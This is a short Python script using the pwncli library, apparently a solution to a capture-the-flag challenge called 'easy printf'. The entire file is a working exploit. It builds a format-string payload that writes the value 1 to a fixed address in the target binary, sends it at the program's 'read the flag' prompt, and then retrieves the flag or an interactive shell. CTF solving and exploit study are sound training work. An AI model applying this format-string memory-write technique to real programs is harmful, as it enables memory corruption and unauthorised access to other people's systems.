#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']

"""
easy printf
"""


payload = fmtstr_payload(offset=11, writes={0x804a04c:1}, write_size='short')
p.sendlineafter("Would you like to read the flag? (yes/no)\n", payload)

get_flag_when_get_shell(p, 0)


p.interactive()